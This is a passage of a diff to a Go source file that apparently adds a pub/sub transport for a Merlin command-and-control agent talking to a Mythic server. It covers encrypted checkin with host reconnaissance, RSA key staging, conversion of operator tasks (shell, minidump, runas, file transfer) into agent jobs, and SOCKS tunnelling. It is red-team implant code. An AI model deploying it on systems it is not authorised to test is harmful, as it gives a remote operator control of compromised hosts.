@@ -21,50 +21,113 @@ along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
 package main
 
 import (
+	"bytes"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
-	"strings"
-        "encoding/base64"
-        "encoding/json"
-	"os"
 	"net"
+	"os"
 	"runtime"
-	"time"
+	"strings"
 	"sync"
-        "github.com/Ne0nd0g/merlin-message"
-        "github.com/Ne0nd0g/merlin-message/jobs"
+	"time"
+
 	"github.com/Ne0nd0g/merlin-agent/v2/core"
+	merlinOS "github.com/Ne0nd0g/merlin-agent/v2/os"
+	messages "github.com/Ne0nd0g/merlin-message"
+	"github.com/Ne0nd0g/merlin-message/jobs"
 	"github.com/fatih/color"
 	"github.com/google/uuid"
 )
 
+// SOCKS connection tracking maps (mirrors mythic.go's socksConnection/mythicSocksConnection/socksCounter)
+var socksConnection = sync.Map{}      // Mythic server_id (int32) → Merlin UUID
+var mythicSocksConnection = sync.Map{} // Merlin UUID → Mythic server_id (int32)
+var socksCounter = sync.Map{}          // Merlin UUID → int (packet index counter)
+
 // PubSubClient adapts the generic Transport to Merlin's clients.Client interface
 type PubSubClient struct {
-	transport      *Transport
-	agentID        string
-	config         map[string]interface{}
-	messages       chan interface{}
-	//Store all received jobs in this array until run.Run() retrieves them
-	pendingJobs    []messages.Base
-	mu             sync.Mutex
-	running        bool
-	initialCheckinDone bool
+	transport   *Transport
+	agentID     string // current Mythic UUID (starts as payloadID, updated to callback UUID after checkin)
+	payloadUUID string // original payload UUID (never changes, used for Merlin internal message IDs)
+	stagingUUID string // staging UUID from RSA key exchange (used for frame UUID until checkin completes)
+	instanceID  string // unique per-process ID for routing (prevents same-UUID collision)
+	config      map[string]interface{}
+	messages    chan interface{}
+	pendingJobs []messages.Base
+	mu          sync.Mutex
+	running     bool
+
+	// Encryption settings
+	encryptionMode  string // "aes256_hmac", "rsa", or "none"
+	psk             []byte // 32-byte AES key (nil for plaintext mode)
+	initialChan     chan map[string]interface{}
+	checkinDone     bool
+	listenerStarted bool
+	usedRSAStaging  bool // true if key was obtained via RSA staging
 }
 
-// NewPubSubClient creates a new pub/sub client for Merlin
-func NewPubSubClient(cfg *Config, agentID string) (*PubSubClient, error) {
-	transport, err := NewTransport(cfg)
+// NewPubSubClient creates a new pub/sub client for Merlin.
+// pskB64 is the base64-encoded 32-byte AES key from Mythic's AESPSK parameter.
+// encMode determines encryption: "aes256_hmac" (use PSK), "rsa" (RSA key exchange), "none" (plaintext).
+func NewPubSubClient(cfg *Config, agentID string, pskB64 string, encMode string) (*PubSubClient, error) {
+	instanceID := uuid.New().String()
+
+	if core.Verbose {
+		color.Cyan(fmt.Sprintf("[*] Generated instance ID: %s (agent UUID: %s)", instanceID, agentID))
+		color.Cyan(fmt.Sprintf("[*] Subscription will be: mythic-tasks-sub-%s", instanceID))
+	}
+
+	// Handle encryption mode
+	var pskKey []byte
+	if encMode == "" {
+		encMode = "aes256_hmac" // Default to PSK mode for backward compatibility
+	}
+
+	switch encMode {
+	case "aes256_hmac":
+		if pskB64 == "" {
+			return nil, fmt.Errorf("PSK required for aes256_hmac mode but not provided")
+		}
+		var err error
+		pskKey, err = base64.StdEncoding.DecodeString(pskB64)
+		if err != nil {
+			return nil, fmt.Errorf("failed to decode PSK: %w", err)
+		}
+		if len(pskKey) != 32 {
+			return nil, fmt.Errorf("PSK must be 32 bytes, got %d", len(pskKey))
+		}
+		if core.Verbose {
+			color.Green("[+] AES-256 PSK loaded successfully (static PSK mode)")
+		}
+	case "rsa":
+		if core.Verbose {
+			color.Cyan("[*] RSA key exchange mode — will perform staging to obtain AES key")
+		}
+	case "none":
+		if core.Verbose {
+			color.Yellow("[*] Plaintext mode — NO ENCRYPTION (for testing only)")
+		}
+	default:
+		return nil, fmt.Errorf("unknown encryption mode: %s", encMode)
+	}
+
+	transport, err := NewTransport(cfg, instanceID, agentID)
 	if err != nil {
 		return nil, fmt.Errorf("failed to create pubsub transport: %w", err)
 	}
 
 	client := &PubSubClient{
-		transport:   transport,
-		agentID:     agentID,
-		config:      make(map[string]interface{}),
-		messages:    make(chan interface{}, 100),
-		// Initialize pendingJobs as empty slice
-		pendingJobs: make([]messages.Base, 0),
-		running:     false,
+		transport:      transport,
+		agentID:        agentID,
+		payloadUUID:    agentID,
+		instanceID:     instanceID,
+		config:         make(map[string]interface{}),
+		messages:       make(chan interface{}, 100),
+		pendingJobs:    make([]messages.Base, 0),
+		running:        false,
+		encryptionMode: encMode,
+		psk:            pskKey,
 	}
 
 	return client, nil
@@ -80,526 +143,879 @@ func (p *PubSubClient) Authenticate(msg messages.Base) error {
 
 // Get retrieves a configuration value
 func (p *PubSubClient) Get(key string) string {
-        p.mu.Lock()
-        defer p.mu.Unlock()
-
-        if val, ok := p.config[key]; ok {
-                if str, ok := val.(string); ok {
-                        return str
-                }
-        }
-        return ""
+	p.mu.Lock()
+	defer p.mu.Unlock()
+	if val, ok := p.config[key]; ok {
+		if str, ok := val.(string); ok {
+			return str
+		}
+	}
+	return ""
 }
 
 // Set sets a configuration value
 func (p *PubSubClient) Set(key string, value string) error {
-        p.mu.Lock()
-        defer p.mu.Unlock()
-        p.config[key] = value
-        return nil
+	p.mu.Lock()
+	defer p.mu.Unlock()
+	p.config[key] = value
+	return nil
 }
 
+// Initial performs the checkin with Mythic.
+// If PSK is set (aes256_hmac mode), uses static PSK for encryption.
+// If PSK is nil (none mode), performs RSA key exchange staging first.
 func (p *PubSubClient) Initial() error {
-    // Wait for transport to be fully ready
-    time.Sleep(2 * time.Second)
-    if core.Verbose {
-        color.Cyan("[*] Sending initial checkin via PubSub")
-    }
+	time.Sleep(2 * time.Second)
 
-    // Get system information dynamically
-    hostname, _ := os.Hostname()
-    username := os.Getenv("USER")
-    if username == "" {
-        username = os.Getenv("USERNAME")
-    }
+	// Create channel for synchronous responses
+	p.initialChan = make(chan map[string]interface{}, 10)
 
-    // Get IP addresses
-    ips := []string{}
-    addrs, _ := net.InterfaceAddrs()
-    for _, addr := range addrs {
-        if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
-            if ipnet.IP.To4() != nil {
-                ips = append(ips, ipnet.IP.String())
-            }
-        }
-    }
-    if len(ips) == 0 {
-        ips = []string{"127.0.0.1"}
-    }
+	// Start transport listener goroutine ONCE
+	if !p.listenerStarted {
+		p.listenerStarted = true
+		go func() {
+			err := p.transport.Listen(func(task map[string]interface{}) map[string]interface{} {
+				if core.Debug {
+					color.Yellow(fmt.Sprintf("[DEBUG] Received message: %v", task))
+				}
+				if !p.checkinDone {
+					p.initialChan <- task
+				} else {
+					p.messages <- task
+				}
+				return nil
+			})
+			if err != nil {
+				if core.Verbose {
+					color.Red(fmt.Sprintf("[-] Transport listener error: %v", err))
+				}
+			}
+		}()
+	}
 
-    // Create proper Merlin CHECKIN message using the agent's persistent UUID
-    agentUUID, _ := uuid.Parse(p.agentID)
-    checkinMsg := messages.Base{
-	ID:   agentUUID,
-//      ID:   uuid.New(),
-        Type: messages.CHECKIN,
-        Payload: messages.AgentInfo{
-            Version:  "2.4.2",
-            Build:    "nonRelease",
-            Proto:    "pubsub",
-            SysInfo: messages.SysInfo{
-                Platform:     runtime.GOOS,
-                Architecture: runtime.GOARCH,
-                UserName:     username,
-                HostName:     hostname,
-                Pid:          os.Getpid(),
-                Ips:          ips,
-                Integrity:    3,
-            },
-        },
-        Padding: "",
-    }
+	// Handle encryption based on mode
+	switch p.encryptionMode {
+	case "aes256_hmac":
+		if core.Verbose {
+			color.Cyan("[*] Using static PSK for encryption")
+		}
+	case "rsa":
+		if core.Verbose {
+			color.Cyan("[*] Starting RSA key exchange staging...")
+		}
+		if err := p.performRSAStaging(); err != nil {
+			return fmt.Errorf("RSA staging failed: %w", err)
+		}
+		p.usedRSAStaging = true
+		if core.Verbose {
+			color.Green("[+] RSA staging complete — AES key obtained")
+		}
+	case "none":
+		if core.Verbose {
+			color.Yellow("[*] Plaintext mode — skipping encryption setup")
+		}
+	}
 
-    // Send the checkin message
-    _, err := p.Send(checkinMsg)
-    if err != nil {
-        if core.Verbose {
-            color.Red(fmt.Sprintf("[-] Failed to send initial checkin: %s", err.Error()))
-        }
-        return fmt.Errorf("initial checkin failed: %w", err)
-    }
+	// Now perform encrypted checkin
+	if core.Verbose {
+		color.Cyan("[*] Sending encrypted checkin...")
+	}
 
-    if core.Verbose {
-        color.Green("[+] Initial checkin sent successfully")
-    }
+	// Build checkin JSON
+	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME")
+	}
 
-    return nil
+	ips := []string{}
+	addrs, _ := net.InterfaceAddrs()
+	for _, addr := range addrs {
+		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
+			if ipnet.IP.To4() != nil {
+				ips = append(ips, ipnet.IP.String())
+			}
+		}
+	}
+	if len(ips) == 0 {
+		ips = []string{"127.0.0.1"}
+	}
+
+	// Get integrity level from merlin-agent os package (handles Windows/Unix detection)
+	integrityLevel, _ := merlinOS.GetIntegrityLevel()
+
+	checkinMsg := map[string]interface{}{
+		"action":          "checkin",
+		"uuid":            p.agentID,
+		"ips":             ips,
+		"os":              runtime.GOOS,
+		"user":            username,
+		"host":            hostname,
+		"pid":             os.Getpid(),
+		"architecture":    runtime.GOARCH,
+		"integrity_level": integrityLevel,
+	}
+	checkinJSON, err := json.Marshal(checkinMsg)
+	if err != nil {
+		return fmt.Errorf("failed to marshal checkin: %w", err)
+	}
+
+	// Determine which UUID to use for the frame
+	// - RSA staging mode: use stagingUUID (so Mythic can find the encryption key)
+	// - PSK/plaintext mode: use agentID (payload UUID)
+	frameUUID := p.agentID
+	if p.stagingUUID != "" {
+		frameUUID = p.stagingUUID
+	}
+
+	// Build Mythic frame based on encryption mode
+	var frame string
+	if p.encryptionMode == "none" {
+		// Plaintext mode - no encryption
+		if core.Verbose {
+			color.Yellow(fmt.Sprintf("[*] Sending plaintext checkin (frame UUID: %s)", frameUUID))
+		}
+		frame = buildMythicFrame(frameUUID, checkinJSON)
+	} else {
+		// Encrypted mode (aes256_hmac or rsa)
+		if core.Verbose {
+			color.Cyan(fmt.Sprintf("[*] Sending encrypted checkin (frame UUID: %s, body UUID: %s)", frameUUID, p.agentID))
+		}
+		encrypted, err := aesEncrypt(p.psk, checkinJSON)
+		if err != nil {
+			return fmt.Errorf("failed to AES-encrypt checkin: %w", err)
+		}
+		frame = buildMythicFrame(frameUUID, encrypted)
+	}
+
+	// Send
+	if err := p.transport.SendRaw(frame); err != nil {
+		return fmt.Errorf("failed to send checkin: %w", err)
+	}
+
+	// Wait for response
+	var resp map[string]interface{}
+	select {
+	case resp = <-p.initialChan:
+	case <-time.After(30 * time.Second):
+		return fmt.Errorf("timeout waiting for checkin response")
+	}
+
+	// Extract "message" field from wrapper
+	encodedMsg, ok := resp["message"].(string)
+	if !ok {
+		return fmt.Errorf("checkin response missing 'message' field")
+	}
+
+	// Parse Mythic frame
+	_, body, err := parseMythicFrame(encodedMsg)
+	if err != nil {
+		return fmt.Errorf("failed to parse checkin response frame: %w", err)
+	}
+
+	// Decrypt response (skip for plaintext mode)
+	var plaintext []byte
+	if p.encryptionMode == "none" {
+		plaintext = body
+		if core.Debug {
+			color.Yellow(fmt.Sprintf("[DEBUG] Plaintext checkin response: %s", string(plaintext)))
+		}
+	} else {
+		plaintext, err = aesDecrypt(p.psk, body)
+		if err != nil {
+			return fmt.Errorf("failed to AES-decrypt checkin response: %w", err)
+		}
+		if core.Debug {
+			color.Yellow(fmt.Sprintf("[DEBUG] Decrypted checkin response: %s", string(plaintext)))
+		}
+	}
+
+	// Parse JSON to extract callback UUID
+	var checkinResp map[string]interface{}
+	if err := json.Unmarshal(plaintext, &checkinResp); err != nil {
+		return fmt.Errorf("failed to parse checkin response JSON: %w", err)
+	}
+
+	newID, ok := checkinResp["id"].(string)
+	if !ok || newID == "" {
+		return fmt.Errorf("checkin response missing 'id' field")
+	}
+
+	status, _ := checkinResp["status"].(string)
+	if status != "success" {
+		return fmt.Errorf("checkin response status: %s", status)
+	}
+
+	// Update agent ID to the new callback UUID
+	oldID := p.agentID
+	p.agentID = newID
+	p.transport.agentID = newID
+
+	// Clear staging UUID - no longer needed after successful checkin
+	p.stagingUUID = ""
+
+	// Mark checkin as done — future messages go to p.messages
+	p.checkinDone = true
+
+	if core.Verbose {
+		color.Green(fmt.Sprintf("[+] Checkin successful — UUID updated from %s to %s", oldID, newID))
+	}
+
+	return nil
+}
+
+// performRSAStaging performs the Mythic staging_rsa key exchange to obtain an AES key.
+func (p *PubSubClient) performRSAStaging() error {
+	// Generate RSA key pair
+	privKey, pubKeyDER, err := generateRSAKeyPair()
+	if err != nil {
+		return fmt.Errorf("failed to generate RSA key pair: %w", err)
+	}
+
+	if core.Debug {
+		color.Yellow(fmt.Sprintf("[DEBUG] Generated RSA key pair, public key size: %d bytes", len(pubKeyDER)))
+	}
+
+	// Build staging_rsa message
+	sessionID := uuid.New().String()
+	stagingMsg := map[string]interface{}{
+		"action":     "staging_rsa",
+		"pub_key":    base64.StdEncoding.EncodeToString(pubKeyDER),
+		"session_id": sessionID,
+	}
+	stagingJSON, err := json.Marshal(stagingMsg)
+	if err != nil {
+		return fmt.Errorf("failed to marshal staging_rsa message: %w", err)
+	}
+
+	if core.Verbose {
+		color.Cyan(fmt.Sprintf("[*] Sending staging_rsa with session_id: %s", sessionID))
+	}
+
+	// Build Mythic frame: base64(payloadUUID + plaintext_staging_body)
+	// Note: staging_rsa is sent in plaintext (no encryption yet)
+	frame := buildMythicFrame(p.agentID, stagingJSON)
+
+	// Send
+	if err := p.transport.SendRaw(frame); err != nil {
+		return fmt.Errorf("failed to send staging_rsa: %w", err)
+	}
+
+	// Wait for response
+	var resp map[string]interface{}
+	select {
+	case resp = <-p.initialChan:
+	case <-time.After(30 * time.Second):
+		return fmt.Errorf("timeout waiting for staging_rsa response")
+	}
+
+	// Extract "message" field from wrapper
+	encodedMsg, ok := resp["message"].(string)
+	if !ok {
+		return fmt.Errorf("staging_rsa response missing 'message' field")
+	}
+
+	// Parse Mythic frame
+	_, body, err := parseMythicFrame(encodedMsg)
+	if err != nil {
+		return fmt.Errorf("failed to parse staging_rsa response frame: %w", err)
+	}
+
+	if core.Debug {
+		color.Yellow(fmt.Sprintf("[DEBUG] Received staging_rsa response, body size: %d bytes", len(body)))
+	}
+
+	// Mythic returns JSON with session_key field containing base64-encoded RSA-encrypted key
+	var stagingResp struct {
+		UUID       string `json:"uuid"`
+		SessionID  string `json:"session_id"`
+		SessionKey string `json:"session_key"`
+		Action     string `json:"action"`
+	}
+	if err := json.Unmarshal(body, &stagingResp); err != nil {
+		return fmt.Errorf("failed to parse staging_rsa response JSON: %w", err)
+	}
+
+	if stagingResp.SessionKey == "" {
+		return fmt.Errorf("staging_rsa response missing session_key field")
+	}
+
+	if stagingResp.UUID == "" {
+		return fmt.Errorf("staging_rsa response missing uuid field")
+	}
+
+	// Base64 decode the session_key
+	encryptedKey, err := base64.StdEncoding.DecodeString(stagingResp.SessionKey)
+	if err != nil {
+		return fmt.Errorf("failed to base64 decode session_key: %w", err)
+	}
+
+	if core.Debug {
+		color.Yellow(fmt.Sprintf("[DEBUG] Decoded session_key, encrypted size: %d bytes", len(encryptedKey)))
+	}
+
+	// RSA decrypt to get the AES key
+	aesKey, err := rsaDecryptOAEP(privKey, encryptedKey)
+	if err != nil {
+		return fmt.Errorf("failed to RSA-decrypt AES key: %w", err)
+	}
+
+	if len(aesKey) != 32 {
+		return fmt.Errorf("expected 32-byte AES key, got %d bytes", len(aesKey))
+	}
+
+	// Store the AES key
+	p.psk = aesKey
+
+	// Save the staging UUID - this is needed for building frames so Mythic can find the encryption key.
+	// The payloadUUID stays in agentID and is used inside the JSON body for payload lookup.
+	p.stagingUUID = stagingResp.UUID
+
+	if core.Verbose {
+		color.Green("[+] Successfully obtained 32-byte AES key via RSA staging")
+		color.Green(fmt.Sprintf("[+] Staging UUID: %s", p.stagingUUID))
+	}
+
+	return nil
 }
 
 // min helper function
 func min(a, b int) int {
-      if a < b {
-              return a
-      }
-      return b
+	if a < b {
+		return a
+	}
+	return b
 }
 
-// convertMythicTasksToMerlin converts Mythic task format to Merlin messages.Base
-func (p *PubSubClient) convertMythicTasksToMerlin(mythicMsg map[string]interface{}) messages.Base {
-      base := messages.Base{
-              ID:   uuid.MustParse(p.agentID),
-              Type: messages.JOBS,
-      }
+// convertMythicTasksToMerlin converts Mythic task format to Merlin messages.Base.
+func (p *PubSubClient) convertMythicTasksToMerlin(taskData map[string]interface{}) messages.Base {
+	base := messages.Base{
+		ID:   uuid.MustParse(p.payloadUUID),
+		Type: messages.JOBS,
+	}
 
-      // Decode the base64 "message" field if present
-      var taskData map[string]interface{}
-      if encodedMsg, ok := mythicMsg["message"].(string); ok {
-              // Decode base64 (first time)
-              decodedBytes, err := base64.StdEncoding.DecodeString(encodedMsg)
-              if err != nil {
-                      if core.Verbose {
-                              color.Red(fmt.Sprintf("[-] Failed to decode base64 message: %v", err))
-                      }
-                      base.Payload = []jobs.Job{}
-                      return base
-              }
+	tasksInterface, ok := taskData["tasks"]
+	if !ok {
+		base.Payload = []jobs.Job{}
+		return base
+	}
 
-              // The decoded message has format: UUID (36 chars) + JSON (or base64-encoded JSON)
-              // UUID is always 36 characters (8-4-4-4-12 with dashes)
-              if len(decodedBytes) < 37 {
-                      if core.Verbose {
-                              color.Red("[-] Decoded message too short")
-                      }
-                      base.Payload = []jobs.Job{}
-                      return base
-              }
+	tasksArray, ok := tasksInterface.([]interface{})
+	if !ok {
+		base.Payload = []jobs.Job{}
+		return base
+	}
 
-              // Skip the UUID (first 36 characters)
-              jsonBytes := decodedBytes[36:]
+	merlinJobs := make([]jobs.Job, 0, len(tasksArray))
+	for _, taskInterface := range tasksArray {
+		taskMap, ok := taskInterface.(map[string]interface{})
+		if !ok {
+			continue
+		}
 
-              if core.Debug {
-                      color.Yellow(fmt.Sprintf("[DEBUG] After UUID strip, jsonBytes length: %d", len(jsonBytes)))
-                      color.Yellow(fmt.Sprintf("[DEBUG] First 100 chars of jsonBytes: %s", string(jsonBytes[:min(100, len(jsonBytes))])))
-              }
+		taskID, _ := taskMap["id"].(string)
+		commandStr, _ := taskMap["command"].(string)
 
-              // Check if the JSON portion is still base64 encoded (double encoding)
-              // Try to decode it - if it works, use the decoded version
-              if len(jsonBytes) > 0 {
-                      secondDecode, err := base64.StdEncoding.DecodeString(string(jsonBytes))
-                      if err == nil && len(secondDecode) > 0 {
-                              // Successfully decoded again - the message was double-encoded after UUID
-                              jsonBytes = secondDecode
-                              if core.Debug {
-                                      color.Yellow(fmt.Sprintf("[DEBUG] JSON was base64 encoded, decoded to: %s", string(jsonBytes[:min(100, len(jsonBytes))])))
-                              }
+		// Try to parse parameters as a Job wrapper (set by container's SetManualArgs)
+		// Format: {"type":<int>,"payload":"<json-string>"}
+		var cmd jobs.Command
+		var jobType jobs.Type
+		var payload interface{}
+		var parsedFromWrapper bool
 
-                              // After second decode, there may be a UUID fragment prefix before the JSON
-                              // Find where the actual JSON starts by looking for '{'
-                              jsonStart := -1
-                              for i := 0; i < len(jsonBytes) && i < 40; i++ {
-                                      if jsonBytes[i] == '{' {
-                                              jsonStart = i
-                                              break
-                                      }
-                              }
+		if paramsInterface, ok := taskMap["parameters"]; ok {
+			if paramsStr, ok := paramsInterface.(string); ok {
+				var wrapper struct {
+					Type    int    `json:"type"`
+					Payload string `json:"payload"`
+				}
+				if err := json.Unmarshal([]byte(paramsStr), &wrapper); err == nil && wrapper.Payload != "" {
+					parsedFromWrapper = true
+					jobType = jobs.Type(wrapper.Type)
+					switch jobType {
+					case jobs.SOCKS:
+						var s jobs.Socks
+						json.Unmarshal([]byte(wrapper.Payload), &s)
+						payload = s
+					case jobs.FILETRANSFER:
+						var ft jobs.FileTransfer
+						json.Unmarshal([]byte(wrapper.Payload), &ft)
+						payload = ft
+					default:
+						json.Unmarshal([]byte(wrapper.Payload), &cmd)
+						if cmd.Command == "" {
+							cmd.Command = commandStr
+						}
+						payload = cmd
+					}
+				}
 
-                              if jsonStart > 0 {
-                                      jsonBytes = jsonBytes[jsonStart:]
-                                      if core.Debug {
-                                              color.Yellow(fmt.Sprintf("[DEBUG] Stripped %d-char prefix, JSON now: %s", jsonStart, string(jsonBytes[:min(100, len(jsonBytes))])))
-                                      }
-                              }
-                      }
-              }
+				// Fall back: parse as raw parameters map
+				if !parsedFromWrapper {
+					var paramsMap map[string]interface{}
+					if err := json.Unmarshal([]byte(paramsStr), &paramsMap); err == nil {
+						if payloadInterface, ok := paramsMap["payload"]; ok {
+							if payloadStr, ok := payloadInterface.(string); ok {
+								json.Unmarshal([]byte(payloadStr), &cmd)
+							} else if payloadMap, ok := payloadInterface.(map[string]interface{}); ok {
+								if c, ok := payloadMap["command"].(string); ok {
+									cmd.Command = c
+								}
+								if a, ok := payloadMap["args"].([]interface{}); ok {
+									for _, arg := range a {
+										if argStr, ok := arg.(string); ok {
+											cmd.Args = append(cmd.Args, argStr)
+										}
+									}
+								}
+							}
+						}
+					}
+				}
+			}
+		}
 
-              // Parse JSON
-              if err := json.Unmarshal(jsonBytes, &taskData); err != nil {
-                      if core.Verbose {
-                              color.Red(fmt.Sprintf("[-] Failed to unmarshal message: %v", err))
-                              color.Red(fmt.Sprintf("[-] Decoded bytes length: %d", len(decodedBytes)))
-                              color.Red(fmt.Sprintf("[-] First 50 chars: %s", string(decodedBytes[:min(50, len(decodedBytes))])))
-                              color.Red(fmt.Sprintf("[-] JSON portion: %s", string(jsonBytes[:min(200, len(jsonBytes))])))
-                      }
-                      // Return empty payload when parsing fails
-                      base.Payload = []jobs.Job{}
-                      return base
-              }
-      } else {
-              // No encoded message, use mythicMsg directly
-              taskData = mythicMsg
-      }
+		if !parsedFromWrapper {
+			if cmd.Command == "" {
+				cmd.Command = commandStr
+			}
 
-      // Extract tasks array from decoded data
-      tasksInterface, ok := taskData["tasks"]
-      if !ok {
-              // No tasks, return empty JOBS message
-              base.Payload = []jobs.Job{}
-              return base
-      }
+			switch strings.ToLower(cmd.Command) {
+			case "exit", "agentinfo", "ja3", "killdate", "maxretry", "padding", "parrot", "skew", "sleep", "initialize", "connect", "listener":
+				jobType = jobs.CONTROL
+			case "shell", "run", "exec":
+				jobType = jobs.CMD
+			case "ps", "pipes", "uptime", "netstat", "ssh", "token", "runas", "memory", "memfd", "link", "unlink":
+				jobType = jobs.MODULE
+			case "create-process", "minidump", "invoke-assembly", "load-assembly", "list-assembly":
+				jobType = jobs.MODULE
+			case "ls", "cd", "pwd", "rm", "env", "ifconfig", "killprocess", "nslookup", "touch", "sdelete":
+				jobType = jobs.NATIVE
+			case "socks":
+				jobType = jobs.SOCKS
+			case "download", "upload":
+				jobType = jobs.FILETRANSFER
+			default:
+				jobType = jobs.NATIVE
+			}
 
-      tasksArray, ok := tasksInterface.([]interface{})
-      if !ok {
-              base.Payload = []jobs.Job{}
-              return base
-      }
+			// Set the correct payload type based on job type
+			switch jobType {
+			case jobs.SOCKS:
+				payload = jobs.Socks{}
+			case jobs.FILETRANSFER:
+				payload = jobs.FileTransfer{}
+			default:
+				payload = cmd
+			}
+		}
 
-      // Convert Mythic tasks to Merlin job format
-      merlinJobs := make([]jobs.Job, 0, len(tasksArray))
-      for _, taskInterface := range tasksArray {
-              taskMap, ok := taskInterface.(map[string]interface{})
-              if !ok {
-                      continue
-              }
+		job := jobs.Job{
+			AgentID: uuid.MustParse(p.payloadUUID),
+			ID:      taskID,
+			Token:   uuid.New(),
+			Type:    jobType,
+			Payload: payload,
+		}
 
-              // Extract task details
-              taskID, _ := taskMap["id"].(string)
-              commandStr, _ := taskMap["command"].(string)
+		merlinJobs = append(merlinJobs, job)
 
-              // Parse parameters to get command and args
-              // Parameters format: JSON string with "type" and "payload" fields
-              // Where "payload" is ANOTHER JSON string with "command" and "args"
-              var cmd jobs.Command
-              if paramsInterface, ok := taskMap["parameters"]; ok {
-                      if paramsStr, ok := paramsInterface.(string); ok {
-                              // Parse first level: {"type":4,"payload":"{...}"}
-                              var paramsMap map[string]interface{}
-                              if err := json.Unmarshal([]byte(paramsStr), &paramsMap); err == nil {
-                                      // Extract the nested payload
-                                      if payloadInterface, ok := paramsMap["payload"]; ok {
-                                              if payloadStr, ok := payloadInterface.(string); ok {
-                                                      // Parse second level: {"command":"ls","args":["-a"]}
-                                                      json.Unmarshal([]byte(payloadStr), &cmd)
-                                              } else if payloadMap, ok := payloadInterface.(map[string]interface{}); ok {
-                                                      // Direct map
-                                                      if c, ok := payloadMap["command"].(string); ok {
-                                                              cmd.Command = c
-                                                      }
-                                                      if a, ok := payloadMap["args"].([]interface{}); ok {
-                                                              for _, arg := range a {
-                                                                      if argStr, ok := arg.(string); ok {
-                                                                              cmd.Args = append(cmd.Args, argStr)
-                                                                      }
-                                                              }
-                                                      }
-                                              }
-                                      }
-                              }
-                      }
-              }
+		// create a RESULT job to acknowledge the task to Mythic
+		if taskID != "" && (jobType == jobs.SOCKS || jobType == jobs.CONTROL) {
+			ackJob := jobs.Job{
+				AgentID: uuid.MustParse(p.payloadUUID),
+				ID:      taskID,
+				Token:   uuid.New(),
+				Type:    jobs.RESULT,
+				Payload: jobs.Results{Stdout: fmt.Sprintf("Task received: %s", commandStr)},
+			}
+			merlinJobs = append(merlinJobs, ackJob)
+		}
 
-              // If command wasn't in parameters, use the task command
-              if cmd.Command == "" {
-                      cmd.Command = commandStr
-              }
+		if core.Debug {
+			color.Yellow(fmt.Sprintf("[DEBUG] Created job: ID=%s, Command=%s, Args=%v", job.ID, cmd.Command, cmd.Args))
+		}
+	}
 
-              // Determine the correct job type based on command
-              var jobType jobs.Type
-              switch strings.ToLower(cmd.Command) {
-              // CONTROL type commands
-              case "exit", "agentinfo", "ja3", "killdate", "maxretry", "padding", "parrot", "skew", "sleep", "initialize", "connect", "listener":
-                      jobType = jobs.CONTROL
-              // CMD type commands (shell execution)
-              case "shell", "run", "exec":
-                      jobType = jobs.CMD
-              // MODULE type commands
-              case "ps", "pipes", "uptime", "netstat", "ssh", "token", "runas", "memory", "memfd", "link", "unlink":
-                      jobType = jobs.MODULE
-              case "createprocess", "minidump", "invoke-assembly", "load-assembly", "list-assemblies":
-                      jobType = jobs.MODULE
-              // NATIVE type commands (built-in OS commands)
-              case "ls", "cd", "pwd", "rm", "env", "ifconfig", "killprocess", "nslookup", "touch", "sdelete":
-                      jobType = jobs.NATIVE
-              // Default to NATIVE for unknown commands
-              default:
-                      jobType = jobs.NATIVE
-              }
+	if core.Debug {
+		color.Yellow(fmt.Sprintf("[DEBUG] Total jobs created: %d", len(merlinJobs)))
+	}
 
-              // Create proper Merlin job
-              job := jobs.Job{
-                      AgentID: uuid.MustParse(p.agentID),
-                      ID:      taskID,
-                      Token:   uuid.New(),
-                      Type:    jobType,
-                      Payload: cmd,
-              }
-
-              merlinJobs = append(merlinJobs, job)
-
-              if core.Debug {
-                      color.Yellow(fmt.Sprintf("[DEBUG] Created job: ID=%s, Command=%s, Args=%v", job.ID, cmd.Command, cmd.Args))
-              }
-      }
-
-      if core.Debug {
-              color.Yellow(fmt.Sprintf("[DEBUG] Total jobs created: %d", len(merlinJobs)))
-      }
-
-      // Assign []jobs.Job directly - interface{} can hold any type
-      // Don't convert to []interface{} as that breaks type assertions in run.Run()
-      base.Payload = merlinJobs
-      return base
+	base.Payload = merlinJobs
+	return base
 }
 
+// mythicSocks is the Mythic wire format for SOCKS data (matches mythic/structs.go Socks struct)
+type mythicSocks struct {
+	ServerId int32  `json:"server_id"`
+	Data     string `json:"data"`
+	Exit     bool   `json:"exit"`
+}
+
+// convertSocksToJobs converts Mythic SOCKS messages to Merlin jobs (ported from mythic.go convertSocksToJobs)
+func (p *PubSubClient) convertSocksToJobs(socks []mythicSocks) (messages.Base, error) {
+	base := messages.Base{
+		Type: messages.JOBS,
+		ID:   uuid.MustParse(p.payloadUUID),
+	}
+
+	var returnJobs []jobs.Job
+
+	for _, sock := range socks {
+		job := jobs.Job{
+			AgentID: uuid.MustParse(p.payloadUUID),
+			Type:    jobs.SOCKS,
+		}
+		payload := jobs.Socks{
+			Close: sock.Exit,
+		}
+
+		// Translate Mythic's server_id to a Merlin UUID
+		id, ok := socksConnection.Load(sock.ServerId)
+		if !ok {
+			// New SOCKS connection — create bidirectional mapping
+			id = uuid.New()
+			socksConnection.Store(sock.ServerId, id)
+			mythicSocksConnection.Store(id, sock.ServerId)
+			socksCounter.Store(id, 0)
+
+			// Spoof initial SOCKS5 handshake (version 5, 1 method, no auth)
+			payload.ID = id.(uuid.UUID)
+			payload.Data = []byte{0x05, 0x01, 0x00}
+			payload.Index = 0
+			job.Payload = payload
+			returnJobs = append(returnJobs, job)
+		}
+		payload.ID = id.(uuid.UUID)
+
+		// Base64 decode Mythic's data
+		var err error
+		payload.Data, err = base64.StdEncoding.DecodeString(sock.Data)
+		if err != nil {
+			return base, fmt.Errorf("failed to base64 decode SOCKS data: %w", err)
+		}
+
+		// Track packet ordering with index counter
+		i, ok := socksCounter.Load(id)
+		if !ok {
+			return base, fmt.Errorf("SOCKS counter not found for UUID: %s", id)
+		}
+		payload.Index = i.(int) + 1
+		job.Payload = payload
+		socksCounter.Store(id, i.(int)+1)
+		returnJobs = append(returnJobs, job)
+	}
+
+	base.Payload = returnJobs
+	return base, nil
+}
 
 // Listen starts listening for messages from the server
 func (p *PubSubClient) Listen() ([]messages.Base, error) {
-      p.mu.Lock()
-      if !p.running {
-              // First time - start the listener goroutine
-              p.running = true
-              p.mu.Unlock()
+	p.mu.Lock()
+	if !p.running {
+		p.running = true
+		p.mu.Unlock()
 
-              if core.Verbose {
